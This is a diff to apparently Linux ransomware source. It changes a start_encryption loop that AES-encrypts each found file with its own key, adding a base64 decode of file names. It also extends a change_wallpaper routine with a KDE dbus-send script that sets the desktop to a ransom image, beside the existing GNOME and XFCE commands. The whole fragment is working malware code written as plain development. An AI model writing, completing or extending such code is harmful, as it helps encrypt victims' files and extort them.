@@ -74,7 +74,8 @@ def start_encryption(files):
     for found_file in files:
         key = generate_keys.generate_key(32, True)
         AES_obj = symmetric.AESCipher(key)
-
+        
+        found_file = base64.b64decode(found_file)
         with open(found_file, 'rb') as f:
             file_content = f.read()
         
@@ -187,9 +188,22 @@ def change_wallpaper():
     xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''.format(ransomware_path + "/img.png")
     xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'.format(ransomware_path + "/img.png")
 
+    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
+var Desktops = desktops();                                                                                                                       
+for (i=0;i<Desktops.length;i++) {
+        d = Desktops[i];
+        d.wallpaperPlugin = "org.kde.image";
+        d.currentConfigGroup = Array("Wallpaper",
+                                    "org.kde.image",
+                                    "General");
+        d.writeConfig("Image", "file:///home/tarcisio/gonnacry/img.png");
+}'
+"""
+
     os.system(gnome)
     os.system(xfce)
     os.system(xfce1)
+    os.system(kde)
 
 if __name__ == "__main__":
     menu()
